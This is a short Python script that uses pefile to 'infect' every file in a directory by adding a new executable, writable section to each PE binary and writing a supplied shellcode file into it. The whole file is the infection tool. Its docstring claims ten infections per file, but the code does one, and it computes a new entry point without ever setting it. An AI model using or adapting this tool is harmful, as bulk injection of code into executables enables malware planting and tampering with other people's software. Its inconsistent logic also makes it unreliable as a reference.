import pefile
import mmap
import os
from os import listdir
from os.path import join, isdir, isfile
from sys import argv

"""
File to inject a binary into a new section 10 times of all files in a directory

Code for the infect function taken from: https://axcheron.github.io/code-injection-with-python/

First argument should be a file containing data used to infect other files. The
second argument should be a filepath for a directory containing PE files that
will be infected with the first file 10 times. Make sure you have a backup of
these files before infecting
"""

if len(argv) != 3:
    print("Error: Incorrect arguments")
    print("python fileInjection.py <fileToInject> <directoryOfFiles>")
    exit(1)

f = open(argv[1], "rb")
shellcode = f.read()

def align(val_to_align, alignment):
    return ((val_to_align + alignment - 1) / alignment) * alignment

def infect(exe_path, shellcode):
    """
    Function to infect a file with other data into a new section

    Args:
        exe_path (string): file path used for a file to infect
        shellcode (byte string): byte string containing the data to use to infect a file
    """

    original_size = os.path.getsize(exe_path)

    fd = open(exe_path, 'a+b')
    map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
    map.resize(original_size + 0x1000)
    map.close()
    fd.close()

    pe = pefile.PE(exe_path)

    number_of_section = pe.FILE_HEADER.NumberOfSections
    last_section = number_of_section - 1
    file_alignment = pe.OPTIONAL_HEADER.FileAlignment
    section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
    new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + 40)

    # Look for valid values for the new section header
    raw_size = align(0x1000, file_alignment)
    virtual_size = align(0x1000, section_alignment)
    raw_offset = align((pe.sections[last_section].PointerToRawData +
                        pe.sections[last_section].SizeOfRawData),
                       file_alignment)

    virtual_offset = align((pe.sections[last_section].VirtualAddress +
                            pe.sections[last_section].Misc_VirtualSize),
                           section_alignment)

    # CODE | EXECUTE | READ | WRITE
    characteristics = 0xE0000020
    # Section name must be equal to 8 bytes
    name = ".data" + (3 * '\x00')

    # Create the section
    # Set the name
    pe.set_bytes_at_offset(new_section_offset, name)
    # Set the virtual size
    pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
    # Set the virtual offset
    pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
    # Set the raw size
    pe.set_dword_at_offset(new_section_offset + 16, raw_size)
    # Set the raw offset
    pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
    # Set the following felds to zero
    pe.set_bytes_at_offset(new_section_offset + 24, (12 * '\x00'))
    # Set the characteristics
    pe.set_dword_at_offset(new_section_offset + 36, characteristics)

    # Modify the Main Headers
    pe.FILE_HEADER.NumberOfSections += 1
    pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset
    pe.write(exe_path)
    pe = pefile.PE(exe_path)
    number_of_section = pe.FILE_HEADER.NumberOfSections
    last_section = number_of_section - 1
    new_ep = pe.sections[last_section].VirtualAddress
    raw_offset = pe.sections[last_section].PointerToRawData

    pe.set_bytes_at_offset(raw_offset, shellcode)

    pe.write(exe_path)

path = argv[2]
files = ([path + d for d in listdir(path) if isfile(join(path, d))])
# for every file to infect, run infection function
for f in files:
    infect(f, shellcode)
